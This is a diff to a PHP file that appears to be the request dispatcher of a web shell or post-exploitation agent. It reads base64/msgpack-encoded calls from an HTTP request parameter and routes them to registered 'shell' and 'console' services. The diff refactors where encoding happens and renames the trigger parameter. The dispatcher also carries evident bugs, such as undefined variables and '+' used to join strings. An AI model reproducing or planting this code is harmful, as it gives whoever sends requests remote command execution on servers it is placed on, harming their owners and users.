@@ -347,35 +347,32 @@ class MsgPack_Coder {
 
 class RPCServer
 {
-  var $_msgpack;
-
   var $methods;
 
   var $services;
 
   function RPCServer()
   {
-    $this->_msgpack = new MsgPack_Coder();
     $this->methods = array();
     $this->services = array();
   }
 
   function error_msg($message)
   {
-    return $this->_msgpack->encode(array(
+    return array(
       'type' => 'error',
       'message' => $message
-    ));
+    );
   }
 
-  function response_msg($state,$output,$return_value)
+  function return_value_msg($state,$output,$return_value)
   {
-    return $this->_msgpack->encode(array(
+    return array(
       'type' => 'response',
       'state' => $state,
       'output' => $output,
       'return_value' => $return_value,
-    ));
+    );
   }
 
   function load_state($state)
@@ -410,28 +407,26 @@ class RPCServer
     }
   }
 
-  function call_method($msg)
+  function call_method($request)
   {
-    $call_msg = $this->_msgpack->decode($msg);
-
-    if (!is_array($call_msg))
+    if (!is_array($request))
     {
       return error_msg('Invalid Request message');
     }
 
-    if (!$call_msg['name'])
+    if (!$request['name'])
     {
       return error_msg('Invalid Method Call');
     }
 
-    $method_name = $call_msg['name'];
+    $method_name = $request['name'];
 
     if (!$this->methods[$method_name])
     {
       return error_msg('Unknown method: ' + $method_name);
     }
 
-    $state = $call_msg['state'];
+    $state = $request['state'];
 
     if ($state)
     {
@@ -439,7 +434,7 @@ class RPCServer
     }
 
     $func = $server->methods[$method];
-    $arguments = $call_msg['arguments'];
+    $arguments = $request['arguments'];
 
     if (!$arguments)
     {
@@ -455,7 +450,7 @@ class RPCServer
 
     $updated_state = $this->save_state();
 
-    return response_msg($updated_state,$output,$return_value);
+    return $this->return_value_msg($updated_state,$output,$return_value);
   }
 
   function rpc_services($method)
@@ -751,7 +746,7 @@ function fingerprint($params=array())
 # Inlined PHP: End
 #
 
-if (isset($_REQUEST['rpc_call']))
+if (isset($_REQUEST['rpcrequest']))
 {
   $server = new RPCServer();
   $server->register_method('running', 'running');
@@ -759,8 +754,9 @@ if (isset($_REQUEST['rpc_call']))
   $server->register_service('console', new ConsoleService());
   $server->register_service('shell', new ShellService());
 
-  $msg = base64_decode(rawurldecode($_REQUEST['rpcrequest']));
-  $response = base64_encode($server->call_method($msg));
+  $msgpack = new MsgPack_Coder();
+  $msg = $msgpack->decode(base64_decode(rawurldecode($_REQUEST['rpcrequest'])));
+  $response = base64_encode($msgpack->encode($server->call_method($msg)));
 
   echo("<rpc-response>{$response}</rpc-response>");
   exit;
